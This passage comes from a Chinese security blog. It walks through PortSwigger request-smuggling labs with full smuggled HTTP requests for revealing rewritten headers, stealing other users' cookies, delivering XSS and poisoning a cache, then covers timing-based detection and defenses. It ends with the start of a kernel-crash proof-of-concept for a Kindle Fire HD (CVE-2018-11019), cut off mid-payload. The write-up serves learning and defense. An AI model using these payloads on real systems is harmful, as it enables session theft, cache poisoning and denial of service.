<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
</ul>
<p>怎么理解呢，还是做一下实验来一起来学习下吧。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p>
<p>实验的最终目的还是删除用户 <code>carlos</code>。</p>
<p>我们首先进行第一步骤，找一个能够将请求参数的值输出到响应中的POST请求。</p>
<p>在网页上方的搜索功能就符合要求</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912180347881.png" alt="image-20200912180347881"></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc61f801f8a522a80a1356a00b6005b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: session&#x3D;h1Ca94Fnfl4FURsBEWq2zeZy6mygOG3m</span><br><span class="line">Content-Length: 78</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;ol4three</span><br></pre></td></tr></table></figure>

<p>多次请求之后就可以获得前端服务器添加的请求头</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912181623521.png" alt="image-20200912181623521"></p>
<p>这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;ol4three</span><br></pre></td></tr></table></figure>

<p>其中<code>Content-Length</code>的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。</p>
<p>接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p>
<p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p>
<p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200353242.png" alt="image-20201201200353242"></p>
<h3 id="3-获取其他用户的请求"><a href="#3-获取其他用户的请求" class="headerlink" title="3 获取其他用户的请求"></a>3 获取其他用户的请求</h3><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p>
<p>实验的最终目的是获取其他用户的Cookie用来访问其他账号。</p>
<p>我们首先去寻找一个能够将传入的信息存储到网站中的POST请求表单，很容易就能发现网站中有一个用户评论的地方。</p>
<p>抓取POST请求并构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Cookie: session&#x3D;oGESUVlKzuczaZSzsazFsOCQ4fdLetwa</span><br><span class="line">Content-Length: 267</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;post&#x2F;comment HTTP&#x2F;1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">Cookie: session&#x3D;oGESUVlKzuczaZSzsazFsOCQ4fdLetwa</span><br><span class="line">Content-Length: 400</span><br><span class="line"></span><br><span class="line">csrf&#x3D;JDqCEvQexfPihDYr08mrlMun4ZJsrpX7&amp;postId&#x3D;5&amp;name&#x3D;meng&amp;email&#x3D;email%40qq.com&amp;website&#x3D;&amp;comment&#x3D;</span><br></pre></td></tr></table></figure>

<p>这样其实就足够了，但是有可能是实验环境的问题，我无论怎么等都不会获取到其他用户的请求，反而抓了一堆我自己的请求信息。不过原理就是这样，还是比较容易理解的，最重要的一点是，走私的请求是不完整的。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200427954.png" alt="image-20201201200427954"></p>
<h3 id="4-利用反射型XSS"><a href="#4-利用反射型XSS" class="headerlink" title="4 利用反射型XSS"></a>4 利用反射型XSS</h3><p>我们可以使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p>
<p>在实验介绍中已经告诉了前端服务器不支持分块编码，目标是执行alert(1)</p>
<p>首先根据UA出现的位置构造Payload</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200503751.png" alt="image-20201201200503751"></p>
<p>然后构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac801fd21fef85b98012b3a700820000.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 123</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post?postId&#x3D;5 HTTP&#x2F;1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;#</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>此时在浏览器中访问，就会触发弹框</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200603371.png" alt="image-20201201200603371"></p>
<p>再重新发一下，等一会刷新，可以看到这个实验已经解决了。</p>
<h3 id="5-进行缓存投毒"><a href="#5-进行缓存投毒" class="headerlink" title="5 进行缓存投毒"></a>5 进行缓存投毒</h3><p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p>
<p>实验环境中提供了漏洞利用的辅助服务器。</p>
<p>需要添加两个请求包，一个POST，携带要走私的请求包，另一个是正常的对JS文件发起的GET请求。</p>
<p>以下面这个JS文件为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;resources&#x2F;js&#x2F;labHeader.js</span><br></pre></td></tr></table></figure>

<p>编辑响应服务器</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200709663.png" alt="image-20201201200709663"></p>
<p>构造POST走私数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: acb11fe31e16e96b800e125a013b009f.web-security-academy.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>然后构造GET数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;js&#x2F;labHeader.js HTTP&#x2F;1.1</span><br><span class="line">Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST请求和GET请求交替进行，多进行几次，然后访问js文件，响应为缓存的漏洞利用服务器上的文件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200757014.png" alt="image-20201201200757014"></p>
<p>访问主页，成功弹窗，可以知道，js文件成功的被前端服务器进行了缓存。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200845798.png" alt="image-20201201200845798"></p>
<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><h3 id="检测思路来自于这里，这里提供下检测的demo"><a href="#检测思路来自于这里，这里提供下检测的demo" class="headerlink" title="检测思路来自于这里，这里提供下检测的demo"></a>检测思路来自于<a href="https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/">这里</a>，这里提供下检测的demo</h3><h4 id="1-CL-TE"><a href="#1-CL-TE" class="headerlink" title="1.CL-TE"></a>1.CL-TE</h4><p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1\r\n</span><br><span class="line">Z\r\n</span><br><span class="line">Q\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><strong>检测思路</strong></p>
<p>Content-Length为4的时候，后段chunk收到长度为1的数据快，但是没有结束标志，一直等待，导致前端响应超时（一般超过5s）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1\r\n</span><br><span class="line">Z</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Content-Length为11的时候，此时的G是一个无效的块大小值，所以请求结束，不会超时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">1\r\n</span><br><span class="line">Z\r\n</span><br><span class="line">G\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>因此如果 <code>Content-Length</code> 为 4的响应大于5s ，且 <code>Content-Length</code> 为 4的请求时间远大于 <code>Content-Length</code> 为 11的请求时间，说明存在漏洞。</p>
<h4 id="2-TE-CL"><a href="#2-TE-CL" class="headerlink" title="2 TE-CL"></a>2 TE-CL</h4><p><strong>Payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">X</span><br></pre></td></tr></table></figure>

<p><strong>检测思路：</strong></p>
<p><code>Content-Length</code> 为 6时，后端处理的<code>Content-Length</code>为6，但收到的数据体0\r\n\r\n，因此后端会一直等待第6个字节，直到超时。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><code>Content-Length</code> 为 5时，后端收到的数据体0\r\n\r\n，不会超时。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>因此如果 <code>Content-Length</code> 为 6的响应大于5s ，且 <code>Content-Length</code> 为 6的请求时间远大于 <code>Content-Length</code> 为 5的请求时间，说明存在漏洞。</p>
<h4 id="3-核心demo实现"><a href="#3-核心demo实现" class="headerlink" title="3 核心demo实现"></a>3 核心demo实现</h4><p>因为CL-TE和TE-CL互斥，因此如果存在CL-TE就跳过TE-CL检测，但检测到存在了漏洞时，进行recheck确认后输出。</p>
<p>完整代码：<a href="https://github.com/jweny/HTTP-Request-Smuggling-Checker">https://github.com/jweny/HTTP-Request-Smuggling-Checker</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = self.calcTime(<span class="number">4</span>, <span class="string">&quot;1\r\nZ\r\nQ\r\n\r\n\r\n&quot;</span>, <span class="number">11</span>, <span class="string">&quot;1\r\nZ\r\nQ\r\n\r\n\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = self.calcTime(<span class="number">6</span>, <span class="string">&quot;0\r\n\r\nX&quot;</span>, <span class="number">5</span>, <span class="string">&quot;0\r\n\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcTime</span>(<span class="params">self, length_big_time, payload_big_time, length_small_time, payload_small_time</span>):</span></span><br><span class="line">    <span class="comment"># todo 判断self.payload_headers 不为空</span></span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> self.payload_headers:</span><br><span class="line">        headers[<span class="string">&#x27;Content-Length&#x27;</span>] = length_big_time</span><br><span class="line">        big_time = self.getRespTime(headers, payload_big_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> big_time:</span><br><span class="line">            big_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> big_time &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># Content-Length == 11</span></span><br><span class="line">        headers[<span class="string">&#x27;Content-Length&#x27;</span>] = length_small_time</span><br><span class="line">        small_time = self.getRespTime(headers, payload_small_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> small_time:</span><br><span class="line">            small_time = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> big_time &gt; <span class="number">5</span> <span class="keyword">and</span> big_time / small_time &gt;= <span class="number">5</span>:</span><br><span class="line">            self.valid = <span class="literal">True</span></span><br><span class="line">            self.type = <span class="string">&quot;CL-TE&quot;</span></span><br><span class="line">            self.result_headers = [headers]</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><blockquote>
<ul>
<li>禁用代理服务器与后端服务器之间的 TCP 连接重用</li>
<li>使用 HTTP/2 协议</li>
<li>前后端使用相同的服务器</li>
</ul>
<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的 TCP 连接重用，会增大后端服务器的压力。使用 HTTP/2 在现在的网络条件下根本无法推广使用，哪怕支持 HTTP/2 协议的服务器也会兼容 HTTP/1.1。从本质上来说，HTTP 请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现 RFC7230-7235 中所规定的的标准，但这也是最难做到的。</p>
</blockquote>
<p>对于HTTP/2 能避免请求走私的原理，去查了一下HTTP/2 简介，总结一下，HTTP/1.1 的一些特性为请求走私创造了条件：</p>
<blockquote>
<ol>
<li><p>纯文本，以换行符作为分隔符</p>
</li>
<li><p>序列和阻塞机制</p>
</li>
</ol>
</blockquote>
<p>而在HTTP/2 中已经没有了产生请求走私的机会</p>
<blockquote>
<ol>
<li>使用<strong>二进制编码</strong>且分割为更小的传输单位（帧，拥有编号，<strong>可乱序传输</strong>）</li>
<li><strong>同一个来源的所有通信都在一个 TCP 连接上完成</strong>，此连接可以承载任意数量的双向数据流</li>
</ol>
</blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">With the new binary framing mechanism in place, HTTP&#x2F;2 no longer needs multiple TCP connections to multiplex streams in parallel; each stream is split into many frames, which can be interleaved and prioritized. As a result, all HTTP&#x2F;2 connections are persistent, and only one connection per origin is required, which offers numerous performance benefits.</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://paper.seebug.org/1048/#5">https://paper.seebug.org/1048/#5</a></p>
<p><a href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p>
<p><a href="https://xz.aliyun.com/t/6631">https://xz.aliyun.com/t/6631</a></p>
<p><a href="https://en.wikipedia.org/wiki/HTTP_pipelining">HTTP pipelining</a></p>
<p><a href="https://developers.google.com/web/fundamentals/performance/http2">HTTP/2 简介</a></p>
<p><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf">https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf</a></p>
<p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p>
<p><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>
<p><a href="https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/">https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/</a></p>
<p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p>
<p><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>HTTP请求走私协议</tag>
        <tag>协议分析</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11019%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）是美国亚马逊（Amazon）公司的一款Fire OS平板电脑设备。Fire OS是运行在其中的一套专用于Amazon设备的基于Android开发的移动操作系统。kernel是其中的一个内核组件。 Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3版本中的kernel组件的kernel/omap/drivers/misc/gcx/gcioctl/gcif.c文件存在安全漏洞。攻击者可借助3221773726命令利用该漏洞注入特制的参数，造成内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<p>-</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span 